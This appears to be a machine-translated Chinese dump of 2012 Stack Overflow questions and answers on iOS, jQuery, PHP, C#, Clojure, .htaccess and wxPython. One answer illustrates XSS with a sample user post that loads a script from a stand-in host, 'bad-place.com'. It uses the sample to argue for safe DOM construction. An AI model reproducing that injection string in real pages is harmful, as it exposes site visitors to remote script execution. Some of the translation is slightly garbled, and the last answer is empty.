
以防有人想知道。我需要扩展我的 LVM /dev/mapper/vgpool-data

我检查了 lvdisplay 和 vgdisplay 以确保我有足够的空间来扩展并运行 resize2fs -p 并且它有效。我从[这里得到了这个信息](http://www.tcpdump.com/kb/os/linux/lvm-resizing-guide/expand.html)

# iphone - for in 循环返回错误的对象

> ID：11782517
> 
> 赞同：0
> 
> 时间：2012-08-02T17:13:42.063
> 
> 标签：iphone, objective-c, ipad, cocos2d-iphone, for-in-loop

我有一个 for in 循环，我没有完全得到我期望得到的对象。

我有一个名为 CCLayer 的类`MainLayer`，我在其中添加了 class 的孩子`MyUniqueClass`。但是，如果我尝试获取所有`MyUniqueClass`对象，我也会得到其他 CCNode 对象。这是我所做的`MainLayer`：

```
for (MyUniqueClass *mUC in self.children){

        NSLog(@"%@", mUC); //Here I get all kinds of objects 

} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T17:19:54.883

尝试找出 CCNode 对象存在的原因。不知何故，他们被添加为孩子。

或者只是忽略它并执行此操作以过滤掉其他节点类：

```
Class uniqueClass = [MyUniqueClass class];
for (MyUniqueClass *mUC in self.children)
{
    if ([mUC isKindOfClass:uniqueClass])
    {
        NSLog(@"%@", mUC);
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-02T17:36:04.230

您似乎相信键入循环变量 as`MyUniqueClass *`将导致循环仅覆盖属于该类的对象。这不是枚举的工作速度。它根本不与类型检查器交互。给循环变量一个静态类型只是让编译器对你在循环体中所做的事情进行类型检查（所以它可以警告你，如果你不小心使用了像文本视图这样的文本字段）并让你使用点语法访问对象的属性。如果您只想对某个类的对象进行操作，则必须显式检入循环体[，如 LearnCocos2D 所示](https://stackoverflow.com/a/11782602/50742)。

# ios - 触摸/拖动快速通话

> ID：11782520
> 
> 赞同：0
> 
> 时间：2012-08-02T17:13:47.560
> 
> 标签：ios, cocos2d-iphone

我正在创建一个射击游戏，您可以在其中触摸屏幕并让玩家射击。我遇到的问题是，当您触摸屏幕并保持向下拖动它时，它会迅速射击。处理这个问题的最佳方法是什么？

我希望玩家能够按住手指并以稳定的速度射击，并在手指向上停止射击。

我正在考虑只使用计时器，但我认为这不是很有效......还有其他想法吗？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:23:10.063

我真的很想看到更多关于你如何实施拍摄的细节，但让我为你提供一种方法来实现这一点：

1.  在 cocos2d 中，您可以使用`CCScheduler`来安排方法调用，而不是使用计时器。这是非常有效的。您不必担心性能。
2.  在预定的方法中，您将检查用户是否仍在触摸屏幕，并据此决定是否拍摄。

以下是一些帮助您入门的代码：

**注意：**我在 cocos2d v2.0 中使用 cocos2d v1.0.1 ..，我认为它`CCScheduler`已移至`CCDirector`.

```
- (void)init {
    // ...

    [[CCScheduler sharedScheduler] scheduleSelector:@selector(shoot:) forTarget:self interval:0.2f paused:NO];

    // ...
}

- (void)shoot:(ccTime)dt {
    if (userIsTouching) {
        [player shoot];
    }
} 
```

# jquery - jquery根据其他元素高度设置类

> ID：11782521
> 
> 赞同：1
> 
> 时间：2012-08-02T17:13:49.747
> 
> 标签：jquery, height, element

我是 jquery 的新手

这是我想要使用 jquery 实现的目标：如果 div id 1 的高度大于窗口高度，则仅将类设置为 div id 1

```
<div id="1">some text</div>
<div id="2">some text</div>
<div id="3">some text</div> 
```

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T17:23:02.857

这是一个示例：

```
$(function() {
    $(window).resize(function() { //whenever window is resized
        var el = $('#1');         //caches the selector
        if (el.height() > $(window).height())   //if #1.height > window.height
            el.addClass('LargerThanWindow');    //add a class to it
        else
            el.removeClass('LargerThanWindow'); //else remove the class
    }).resize(); //triggers the resize handler which we just set inside the 
});              //DOM ready event 
```

[**Fiddle**](http://jsfiddle.net/J2PAw/6/)
垂直调整窗口大小，您将看到应用/删除的类。

# php - Facebook 应用程序无法正常工作

> ID：11782522
> 
> 赞同：0
> 
> 时间：2012-08-02T17:13:53.260
> 
> 标签：php, facebook, header, location

我正在编写一个 Facebook 应用程序，我想仅为 facebook 用户展示该应用程序，并希望获取用户详细信息。我使用了以下代码

```
$facebook = new Facebook(array(
 'appId'  => 'xxxxxx',
 'secret' => 'xxxxxx',
));

$user = $facebook->getUser();

if ($user) {

  try {

  } catch (FacebookApiException $e) {
    error_log($e);
  }
}
else{

  $urlf= $facebook->getLoginUrl(array('scope' => 'user_status,publish_stream'));
  header("Location:".$urlf);
  exit;
}

if ($user) {
  $user_profile = $facebook->api('/me');
} 
```

这里`$urlf`给出了正确的 url，当我在浏览器中复制粘贴该 url 时它运行良好。但标题位置不起作用。此代码位于 Canvas URL 文件夹中。现在的问题是标题位置不起作用。请帮我解决它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T17:35:46.163

It is very hard to guess without any error message, or indication of what's going on. But if your `$urlf` variable is correct, and if redirection is not happening it probably means that there is output **before** `header()` is called.

Make sure that `header()` is called before any output in the page, and it should work. If not you will need to debug your script and display PHP errors, using

```
ini_set('display_errors', 1);
ini_set('error_reporting', -1); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:25:56.283

Try catch 用于尝试某些东西，然后如果有任何错误，请正确解决它。你的尝试没有任何意义，所以它毫无价值。这意味着如果有效，则不会发生任何事情`$facebook->getUser()`。

您应该认真阅读一些有关 PHP 编程的书籍，因为很难说出您的代码试图做什么。

# javascript - Javascript 创建 HTML 对象与创建 HTML 字符串

> ID：11782527
> 
> 赞同：3
> 
> 时间：2012-08-02T17:14:01.840
> 
> 标签：javascript, jquery

非常简单的问题，我找不到答案，也许是因为它不是问题，但我想知道使用 Javascript 创建 HTML 对象或使用字符串构建元素之间是否有区别。例如，将 JS 中的任何 HTML 元素声明为 JS 对象或字符串并让浏览器/库/等解析它们是一种更好的做法吗？例如：

```
jQuery('<div />', {'class': 'example'}); 
```

对比

```
jQuery('<div class="example></div>'); 
```

（仅以 jQuery 为例，但同样的问题也适用于 vanilla JS。）

这对我来说似乎不是问题，但我不是 JS 专家，我想确保我做对了。提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T17:27:46.533

他们都是“正确的”。两者都在不同的时间用于不同的目的。

例如，就页面速度而言，如今只需执行以下操作会更快：

```
document.body.innerHTML = "<header>....big string o' html text</footer>"; 
```

浏览器会立即将其吐出。

为了安全起见，在处理用户输入时，构建元素，将它们附加到 a`documentFragment`然后将它们附加到 DOM（或用新版本替换 DOM 节点，或其他）会更安全。

考虑：

```
var userPost = "My name is Bob.<script src=\"//bad-place.com/awful-things.js\"></script>",
    paragraph = "<p>" + userPost + "</p>";

commentList.innerHTML += paragraph; 
```

相对：

```
var userPost = "My name is Bob.<script src=\"//bad-place.com/awful-things.js\"></script>",
    paragraph = document.createElement("p");

    paragraph.appendChild( document.createTextNode(userPost) );
    commentList.appendChild(paragraph); 
```

一个做坏事，一个不做。

当然，您不必创建`textNodes`，您可以使用`innerText`or`textContent`或其他任何东西（浏览器将自行创建文本节点）。

但考虑您共享的内容和方式始终很重要。

如果它来自您信任的地方以外的任何地方（应该几乎无处可去，除非您提供静态页面，在这种情况下，您为什么要构建 html？），那么您应该牢记注入 - 只有东西你想被注射应该是。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-02T17:23:00.600

根据您的特定情况，任何一种都可能更可取——即，如果所有内容都是硬编码的，那么选项 2 可能会更好，正如@camus 所说。

但是，第一个选项的一个限制是，

```
$("<div data-foo='X' />", { 'class': 'example' }); 
```

不会*工作*。该重载需要一个裸标签作为第一个参数，根本没有属性。

这是[在这里报告的](http://bugs.jquery.com/ticket/11698)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T17:22:39.167

1/ 如果您的属性依赖于调用 $ 函数之前设置的变量，则更好，不必连接字符串和变量。除了这个事实，因为你可以两者都做，而且它只是一些其他人编写的 js 代码，而不是在浏览器中硬编码的 C++ DOM API...

# c# - 处理反序列化错误

> ID：11782529
> 
> 赞同：1
> 
> 时间：2012-08-02T17:14:08.833
> 
> 标签：c#, json.net

我有类从 json 反序列化

```
class SeeSharp
{
   public int Number;  
} 
```

好的 json 就像

> {1号}

来自 PHP 的错误 json 是

> {编号：假}

我使用以下方式处理反序列化错误[http://blog.mrlacey.co.uk/2012/03/debugging-deserialization-errors-in.html](http://blog.mrlacey.co.uk/2012/03/debugging-deserialization-errors-in.html)

当读取 string/int/double/bool/etc 类型的成员失败时，我想将其值设置为这种类型的默认值并将该错误标记为已处理。

目前，[JsonSerializationSettings.Error](http://james.newtonking.com/projects/json/help/index.html?topic=html/P_Newtonsoft_Json_JsonSerializerSettings_Error.htm)委托不允许为失败的成员设置值，并且不显示有关失败的成员类型的任何信息。

如果可以选择以另一种方式做到这一点，那么很高兴知道这一点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T17:34:23.887

你能用这个类吗？

```
public class SeeSharp
{
    public string Number
    {
        get
        {
            return _number.ToString();
        }

        set
        {
            if (!int.TryParse(value, out _number))
                _number = default(int);
        }
    }

    public int _Number { get; set; }
} 
```

`JsonConvert`将使用 string 属性`Number`来设置数据，它自己处理解析。`_Number`然后在您的代码中使用该属性作为`int`

# windows-services - Windows 服务可以通过文本转语音 API 说话吗？

> ID：11782533
> 
> 赞同：0
> 
> 时间：2012-08-02T17:14:15.597
> 
> 标签：windows-services, text-to-speech

我有一个项目想从 Windows 服务内部说话（文本到语音，TTS）。我了解 Windows 服务中没有可用的 GUI。语音 API 会在服务中工作吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T08:35:07.933

GUI 在 Windows 服务中可用。请参阅 WinNT.h 中的 SERVICE_INTERACTIVE_PROCESS 和此[链接](http://msdn.microsoft.com/en-us/library/windows/desktop/ms683502%28v=vs.85%29.aspx)。是的，SAPI 在服务中的工作方式与在桌面应用程序中的工作方式相同。

# clojure - 我在使用原子吗？错了还是有别的东西……？

> ID：11782534
> 
> 赞同：6
> 
> 时间：2012-08-02T17:14:28.750
> 
> 标签：clojure, compiler-errors

基本上...

`=> (atom? 5)`

`CompilerException java.lang.RuntimeException: Unable to resolve symbol: atom? in this context, compiling:(NO_SOURCE_PATH:1)`

`=> (atom? /a)`

`RuntimeException Invalid token: /a clojure.lang.Util.runtimeException (Util.java:156) RuntimeException Unmatched delimiter: ) clojure.lang.Util.runtimeException (Util.java:156)`

`=> (atom? "hello world")`

`CompilerException java.lang.RuntimeException: Unable to resolve symbol: atom? in this context, compiling:(NO_SOURCE_PATH:1)`

所以有人知道发生了什么吗？？我正在使用 Eclipse Juno 4.2，即 CounterClockwise 插件。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-02T18:05:37.520

Clojure 中的原子与其他 Lisps 中的原子完全不同。在经典的 Lisp 中，原子是单个值，定义为不为 null 或不是 cons 单元（对）：

```
(define (atom? x)
  (not (or (pair? x)
           (null? x )))) 
```

在 Clojure 中，原子是一种并发引用类型。Clojure 中的原子可以是单值或集合/序列，其中更新（可变状态更改）保证以原子方式发生。

Clojure 中的引用类型比 Lisp 中的 cons 列表要多得多，而且还有所有 Java 互操作集合类型都需要考虑在内。这使得很难定义对单值的检查。

如果您确实愿意，最简单的检查是查看是否可以计算某些内容。看`(source counted)`，它引用了[clojure.lang.RT](https://github.com/clojure/clojure/blob/master/src/jvm/clojure/lang/RT.java) /count 和 countFrom。在那里，指定了几个类/接口，我将它们包含在以下函数中：

```
=> (defn single-valued?
     [x]
     (not (or (nil? x) 
              (.. x getClass isArray)
              (some #(instance? % x) [clojure.lang.Counted
                                      clojure.lang.IPersistentCollection
                                      java.util.Collection
                                      java.util.Map]))))

=> (map single-valued? [1 "foo" \a 'x true not nil])
(true true true true true true false)

=> (map single-valued? ['(1 2 3 4)
                        [1 2 3 4]
                        {:a 1 :b 2}
                        #{1 2 3 4}
                        (seq [1 2 3 4])
                        (seq {:a 1 :b 2})
                        (seq "foo")
                        (int-array [1 2 3 4])
                        (seq [])])
(false false false false false false false false false) 
```

由于`(seq [])`评估`nil`它不被认为是单值的。当然，具有多个字段的 java 对象，以及 Clojure deftypes / defrecords 将照此注册，即使它们是复合对象。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-08-02T17:47:33.407

我怀疑您将 clojure`atom`与`atom`类似计划的东西混淆了。

*   在方案中，原子是一个基本单位。
*   在 clojure 中，原子是 clojure 的引用类型之一（如 ref 和 var），可以自动更新。

这与 clojure 的并发模型非常吻合。

例如

```
user> (def a (atom '(1 2 3)]); create an atom with value (1 2 3)
user> @a ; look up (deference) the atoms value
(1 2 3)
user> (swap! a (fn [v] (map inc v))) ; add 1 to each element, v is the
                                     ; old value of the atom. other threads will
                                     ; see the three values in a change atomically
user> @a
(2 3 4)
user> (reset! a '(5 10 15))
user> @a
(5 10 15) 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-08-02T17:21:47.053

原子？不是函数。

你可以使用

```
(def x (atom 5))
(instance? clojure.lang.Atom x) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-10-23T09:27:47.057

你可以创建*原子吗？*像这样的功能：

```
 (defn atom? [x]
          (not (coll? x))
    ) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-01-05T18:15:19.280

该`complement`函数返回作为参数传递给它的任何谓词的反面，因此您可以`atom?`使用它：

```
(defn atom?
  [x]
  ((complement coll?) x))

(atom? []) ;=> false
(atom? ()) ;=> false
(atom? {}) ;=> false
(atom? 4) ;=> true 
```

# redirect - 将整个请求重定向到新域，而不在原始请求的 .com 之后添加任何内容

> ID：11782535
> 
> 赞同：0
> 
> 时间：2012-08-02T17:14:32.883
> 
> 标签：redirect, rewrite, http-status-code-301

我已经用谷歌搜索了至少 3 个小时，并尝试了堆栈溢出和其他论坛上的所有示例。有谁知道如何使用 .htaccess（重定向或重写）来将所有流量从一个域重定向到另一个域，而无需在 .com 之后传递任何内容？

我有一个旧域名：

```
http://www.olddomain.com 
```

我想将所有到该域的请求重定向到特定的 URL

```
http://www.newdomain.com/new/directory/ 
```

我在 .htaccess 中尝试了很多类型的重定向和重写规则，但如果我提出如下请求：

```
http://www.olddomain.com/some/directory/ 
```

重定向总是来到新域，如：

```
http://www.newdomain.com/new/directory/some/directory/ 
```

重定向将挂起的 URI 发布到重定向上。

我试过添加？在新 URL 的末尾，这无济于事。

这是我的一些重定向。（更改域名以保护无辜者）

```
RewriteEngine on

#RewriteRule ^ http://www.newdomain.com/new/directory/ [R=301,L]
#RewriteRule ^ http://www.newdomain.com/new/directory/? [R=301,L]
#RewriteRule /?$ http://www.newdomain.com/new/directory/? [R=301,L]
RewriteRule ^([^/\.]+)/?$ http://www.newdomain.com/new/directory/? [R=301,L] 
```

我也尝试了重定向命令...

```
Redirect 301 / http://www.newdomain.com/new/directory/? 
```

这些似乎都没有删除 /some/directory/ 并继续重定向到

```
http://www.newdomain.com/new/directory/some/directory/ 
```

任何想法将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T20:35:39.920

试试：

```
RedirectMatch 301 ^ http://www.newdomain.com/new/directory/? 
```

但是如果你更愿意使用 mod_rewrite，看起来你已经非常接近你的规则了，它只需要让正则表达式匹配*任何东西*：

```
RewriteRule ^ http://www.newdomain.com/new/directory/? [R=301,L] 
```

需要注意的是，如果这两个域实际上都托管在同一个服务器上，同一个文档根目录，并且您将把它放在一个 htaccess 文件中，那么您需要在上面添加一个额外的`RewriteRule`检查主持人：

```
RewriteCond %{HTTP_HOST} olddomain.com$ [NC] 
```

# iphone - 方向更改时更改与 xib 文件连接的自定义 UITableViewCell 中标签的位置

> ID：11782537
> 
> 赞同：0
> 
> 时间：2012-08-02T17:14:40.190
> 
> 标签：iphone, ios, uitableview

我有一个自定义 UITableviewCell xib，与我的 uitableview 连接，我会这样做：

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
static NSString *CellIdentifier = @"MyCell";

UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
if (cell == nil) {
    [[NSBundle mainBundle] loadNibNamed:@"MyCustomCell" owner:self options:nil];

    cell = myCell;
    self.myCell = nil;
}

[self configureCell:cell atIndexPath:indexPath];
return cell;
} 
```

然后当改变设备的方向时，我想改变我的自定义 UITableViewCell 中某些元素的位置，所以在这个方法中：

```
- (void)willRotateToInterfaceOrientation:(UIInterfaceOrientation)toInterfaceOrientation duration:(NSTimeInterval)duration {

if (UIInterfaceOrientationIsLandscape(toInterfaceOrientation)) {

    CGRect myframe = CGRectMake(600, self.arrowLabel.frame.origin.y, self.arrowLabel.frame.size.width, self.arrowLabel.frame.size.height);
        self.arrowLabel.frame = myframe;
} else {

    CGRect myframe = CGRectMake(400, self.arrowLabel.frame.origin.y, self.arrowLabel.frame.size.width, self.arrowLabel.frame.size.height);
        self.arrowLabel.frame = myframe;
}
} 
```

我更改了与我的 UITableViewCell xib 连接的 arrowLabel 的 frame.origin.y 和 frame.origin.y，但只更改了 tableview 的最后一行的位置，另一行中的另一个标签保持在相同的位置，所以我的问题是如何重新加载表格视图？...我也尝试过 [self.tableview reloadData];...但不工作...任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T17:25:55.910

您可能想尝试将帧更改代码放入您的`cellForRowAtIndexPath`. 基本上在那种方法中，你有类似的东西：

```
if (portrait) {
    // use portrait frames
} else {
    // use landscape frames
} 
```

然后在你的`willRotate`方法中你可以调用`[tableView reloadData]`.

**编辑：**

```
- (void)willRotateToInterfaceOrientation:(UIInterfaceOrientation)toInterfaceOrientation duration:(NSTimeInterval)duration {

for (UITableViewCell *cell in [tableView visibleCells]) {

    if (portrait) {
        CGRect myframe = CGRectMake(600, cell.arrowLabel.frame.origin.y, cell.arrowLabel.frame.size.width, cell.arrowLabel.frame.size.height);
        cell.arrowLabel.frame = myframe;
    } else {
        CGRect myframe = CGRectMake(400, cell.arrowLabel.frame.origin.y, cell.arrowLabel.frame.size.width, cell.arrowLabel.frame.size.height);
        cell.arrowLabel.frame = myframe;
    }
}
} 
```

# python - wxPython居中按钮和应用程序在关闭时崩溃

> ID：11782538
> 
> 赞同：0
> 
> 时间：2012-08-02T17:14:44.260
> 
> 标签：python, wxpython

有人能帮我用一块石头杀死两只鸟吗？我一直试图将我的 wxPanel 中的按钮居中一段时间​​，但似乎无法弄清楚。我尝试了不同的属性，例如`wx.CENTER`and`wx.ALIGN_CENTER`和`wx.ALIGN_CENTER_HORIZONTAL`，但似乎无法让按钮移动到面板的中心。我试图居中的按钮`set_button`在`add_unit_pane`方法中。

此外，当我单击 X 按钮关闭程序时，程序崩溃。我没有正确处理关闭事件吗？

有人能指出我错在哪里吗？

```
import wx

class Example(wx.Frame):

    def __init__(self, *args, **kw):
        super(Example, self).__init__(*args, **kw) 
        self.init_ui()

    def init_ui(self):
        self.Bind(wx.EVT_CLOSE, self.on_close_window)

        panel = wx.Panel(self)
        panel_sizer = wx.BoxSizer(wx.VERTICAL)
        panel_sizer.Add(self.add_unit_pane(panel, panel_sizer), 0, wx.EXPAND, border=5)
        panel.SetSizerAndFit(panel_sizer)

        self.Show()

    def on_close_window(self, event):
        self.Destroy()

    def add_unit_pane(self, panel, panel_sizer):
        """ Creates the Unit Measurement panel """
        unit_panel = wx.StaticBox(panel, -1, 'Unit of Measurement')
        unit_panel_sizer = wx.StaticBoxSizer(unit_panel, wx.VERTICAL)

        # Create horizontal row of widgets 1
        hbox1 = wx.BoxSizer(wx.HORIZONTAL)

        st1 = wx.StaticText(panel, label='UNIT:')
        unit_choices = ['in (INCHES)',
                        'cm (CENTIMETERS)',
                        'mm (MILLIMETERS)'
                        ]
        unit_cb = wx.ComboBox(panel, -1, '100%',
                                     choices=unit_choices,
                                     style=wx.CB_DROPDOWN|wx.CB_READONLY)
        unit_cb.SetValue('mm (MILLIMETERS)')

        hbox1.Add(st1)
        hbox1.AddSpacer(5)
        hbox1.Add(unit_cb)

        # Create horizontal row of widgets 2
        hbox2 = wx.BoxSizer(wx.HORIZONTAL)

        st2 = wx.StaticText(panel, label='Pixels per selected unit:')
        tc1 = wx.TextCtrl(panel)

        hbox2.Add(st2)
        hbox2.AddSpacer(5)
        hbox2.Add(tc1)

        # Create horizontal row of widgets 3
        hbox3 = wx.BoxSizer(wx.HORIZONTAL)
        set_button = wx.Button(panel, -1, 'Set')
        hbox3.Add(set_button, 0, wx.CENTER)

        # Add all other sizers to the main unit_panel_sizer
        unit_panel_sizer.Add(hbox1)
        unit_panel_sizer.AddSpacer(5)
        unit_panel_sizer.Add(hbox2)
        unit_panel_sizer.AddSpacer(5)
        unit_panel_sizer.Add(hbox3)

        # Fit all widgets to the sizer
        unit_panel.SetSizerAndFit(unit_panel_sizer)

        # Return the unit_panel_sizer
        return unit_panel_sizer

if __name__ == '__main__':
    ex = wx.App()
    Example(None, -1, "Centering Button", size=(250,150))
    ex.MainLoop() 
```

谢谢你，亚当

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:36:39.950

将添加 hbox3 的行更改为

```
unit_panel_sizer.Add(hbox3,0,wx.CENTER) 
```

也注释掉

```
unit_panel.SetSizerAndFit(unit_panel_sizer) 
```

那应该可以解决您的崩溃问题

# jquery - 在“for .. in”循环中设置 jQuery .css()

> ID：11782543
> 
> 赞同：3
> 
> 时间：2012-08-02T17:15:22.327
> 
> 标签：jquery

1）这工作正常：

```
$(container_elm).css({
  'border-width':'1px'
}) 
```

2）现在我正在尝试将 css propertyName : value 作为参数传递给函数：

```
function my_func(css_arr) {
  if (css_arr!==null && css_arr!=='') {
    for(var x in css_arr) {
      if(css_arr.hasOwnProperty(x)) {
        y=css_arr[x];
        x_new='"'+x+'"';
        y_new='"'+y+'"';

        $(container_elm).css({
            //'border-width':'1px' // this works
            //x:y // this does NOT work
            //x_new:y_new // this does NOT work
        });
        //console.log(x_new, y_new); //returns "border-width" "1px"
        //console.log(x, y); //returns border-width 1px
      }
    }
  }
}

//usage
my_func({'border-width':'1px'}); 
```

关于如何传递 css 对象“propertyName：value”并使 .css() 接收并工作的任何想法？

先感谢您。

编辑：演示 - [http://jsfiddle.net/BRwzF/5/](http://jsfiddle.net/BRwzF/5/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T17:21:46.133

如果您已经在传递 JSON，而不是使用`x`and`x_new`等，为什么不这样做：

```
$(container_elm).css(
    css_arr
); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T17:41:46.717

我完全同意@Somkittens 的建议。只是想向您简要介绍一下为什么`x_new:y_new`不适合您。

在`.css()`jquery 函数中，键/属性不会被解析或视为变量，因此 put `$('dom').css('width': '100px')`or`$('dom').css(width: '100px')`没有任何区别。我们将属性用引号括起来，以防其中包含连字符。即边界半径，-webkit-边界半径等。

但是，如果您想使用您的解决方案，在这种情况下，您可以稍微调整一下代码，这与@SomeKittens 的作用相同

```
 y=css_arr[x];
 x_new=x;
 y_new=y;
 var foobar = {};
     foobar[x_new] = y_new;
 $(container_elm).css(foobar); 
```

演示：http: [//jsfiddle.net/4tBVH/](http://jsfiddle.net/4tBVH/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T17:28:54.977

你不需`for`要这样做。
`css_arr`是具有 css 样式的对象。您可以将其直接传递给`.css()`.
例子：`$(container_elm).css(css_arr);`

**建议**：`css_arr`改为`style`.

[**演示**](http://jsfiddle.net/ricardolohmann/sx3nc/2/)

# nhibernate - nHibernate 将过滤的包映射到单个属性

> ID：11782546
> 
> 赞同：2
> 
> 时间：2012-08-02T17:15:39.333
> 
> 标签：nhibernate, mapping, components, one-to-many, mapping-by-code

我需要将一个实体映射到一个数据库的主表。

该实体与另一个实体具有 OneToMany。

我需要将主实体的集合映射到子表的所有行。

但我还需要使用从子表中获取的单行映射一个属性，并按始终只返回一行的条件进行过滤。

有点像组件，但在过滤的子表中。

这是我的映射：

```
public class Test
    {
        public virtual string Id { get; set; }
        public virtual string Description { get; set; }
        public virtual IList<TestItem> Items { get; set; }
        public virtual TestItem Item { get; set; }

        public Test()
        {
            Items = new List<TestItem>();
        }
    }

    public class TestItem
    {
        public virtual string Id { get; set; }
        public virtual Test Test { get; set; }
        public virtual string ItemCode { get; set; }
        public virtual string ItemData { get; set; }
    }

    public class TestMap : ClassMapping<Test>
    {
        public TestMap()
        {
            Id(x => x.Id, m => m.Column("IDTest"));

            //IPOTETICAL
            SomeComponent(x => x.Item, c => // How to map a filtered collection to a single property??
            {
                c.Key(k =>
                {
                    k.NotNullable(true);
                    k.Column("IDTest");
                });

                **// This Is the filter**
                c.Filter("itemsFilter", f => f.Condition("ItemCode = :itemsCodeValue"));

            }, r => r.OneToMany(m =>
            {
                m.NotFound(NotFoundMode.Exception);
                m.Class(typeof(TestItem));
            }));

            Bag(x => x.Items, c =>  // All Child Rows
            {
                c.Key(k =>
                {
                    k.NotNullable(true);
                    k.Column("IDTest");
                });
                c.Cascade(Cascade.All | Cascade.DeleteOrphans);
                c.Lazy(CollectionLazy.NoLazy);
                c.Inverse(true);
            }, r => r.OneToMany(m =>
            {
                m.NotFound(NotFoundMode.Exception);
                m.Class(typeof(TestItem));
            }));
        }
    }

    public class TestItemMap : ClassMapping<TestItem>
    {
        public TestItemMap()
        {
            Id(x => x.Id, m => m.Column("IDTestItem"));

            ManyToOne(x => x.Test, m =>
            {
                m.Column("IDTest");
                m.NotNullable(false);
                m.Lazy(LazyRelation.NoLazy);
            });

            Property(x => x.ItemCode);
            Property(x => x.ItemData);
        }
    } 
```

我发现了一些关于 DynamicComponent 但我不知道它是否适合我......

[http://notherdev.blogspot.it/2012/01/mapping-by-code-dynamic-component.html](http://notherdev.blogspot.it/2012/01/mapping-by-code-dynamic-component.html)

谢谢你！！

# iphone - Iphone 状态栏消息

> ID：11782549
> 
> 赞同：0
> 
> 时间：2012-08-02T17:16:02.960
> 
> 标签：iphone

有谁知道如何在状态栏下方显示一个彩条（就像呼叫最小化时“返回呼叫”一样）？我需要对我的应用程序做同样的事情，但我的应用程序不是音频、音乐、VoIP 或与位置相关的应用程序。我想在应用程序最小化时向用户显示，并且只需单击状态并返回应用程序即可。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T17:19:27.330

这在 iOS 中是不可能的。对不起 ：（

# c# - c# - 减去两次返回负值

> ID：11782551
> 
> 赞同：1
> 
> 时间：2012-08-02T17:16:04.850
> 
> 标签：c#, datetime, timespan

当我尝试在特定情况下用 hr1 减去 hr2 时遇到问题，例如，当`hr1 = 13:00`和`hr2 = 15:00`，好的，结果是`02:00`。但是当值为:`hr1 = 22:00`和`hr2 = 02:00`时，结果是`20:00`。结果应该是`04:00`。

```
 TimeSpan ts1 = hr1.Subtract(hr2).Duration();
 TextBox1.Text = ts1.ToString(); 
```

我怎么解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T17:18:32.187

我了解您想要什么，但是您目前如何尝试实现它是没有意义的。22 小时减去 20 小时是 2 小时，这是正确的。

你可能想要这个：

```
new DateTime(1, 1, 2, 2, 0, 0) - new DateTime(1, 1, 1, 22, 0, 0) 
```

你不想减去 TimeSpan，你想减去日期（在这种情况下是假日期）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T17:22:55.953

调用`Duration()`总是会产生一个肯定的`TimeSpan`。问题在于您在计算中丢弃了天数。22:00-02:00*为*20:00。我相信您期望它是 04:00，因为 02:00 代表“明天”。如果这是您想要的，您将需要计算 22:00-(02:00+24:00) 这将为您提供 -04:00，当您调用时将变为 04:00 `Duration()`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T17:25:52.590

您正在尝试减去两个“跨度”或持续时间，而不是固定的时间点。您的代码目前所说的是，我想从 20 小时（实际上是 20 小时）中减去两个小时。相反，您需要使用`DateTime`s. 困难的部分将是决定你的时间跨度的日期。我会重新编写代码以使用`DateTime`s 并及时保留您实际尝试计算的“时刻”。

编辑：从 a 转换`TimeSpan`为 a`DateTime`可能会导致您丢失影响结果结果的信息：

```
var ts1 = new DateTime (1, 1, 1, hr1.Hours, hr1.Minutes, hr1.Seconds, hr1.Milliseconds) -
          new DateTime (1, 1, 1, hr2.Hours, hr2.Minutes, hr2.Seconds, hr2.Milliseconds); 
```

不同于：

```
var ts1 = new DateTime (1, 1, 1, hr1.Hours, hr1.Minutes, hr1.Seconds, hr1.Milliseconds) -
          new DateTime (1, 1, 2, hr2.Hours, hr2.Minutes, hr2.Seconds, hr2.Milliseconds); 
```

或者：

```
var ts1 = new DateTime (1, 1, 2, hr1.Hours, hr1.Minutes, hr1.Seconds, hr1.Milliseconds) -
          new DateTime (1, 1, 1, hr2.Hours, hr2.Minutes, hr2.Seconds, hr2.Milliseconds); 
```

这就是为什么您需要使用`DateTime`.

# ios - 设置配置文件过期

> ID：11782552
> 
> 赞同：3
> 
> 时间：2012-08-02T17:16:04.940
> 
> 标签：ios, security, provisioning, ios-provisioning

是否可以设置配置文件的到期日期？我正在公司内部进行一次内部审判，我想将`expiration`日期定为审判的结束；而不是仅仅从`creation`日期算起一年。有可能还是从日期算起总是一年`creation`？

此外，如果无法设置`expiration`日期，是否可以从门户中终止配置文件，这样应用程序本身就会过期并且无法打开？还是我最好只编写一些不允许在某个日期之后打开应用程序的东西？

如果重要的话，该试验将是一个 5-10 人的小型营销试验。这些设备是 iPad 2s 或 iPhone 4。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T19:01:34.890

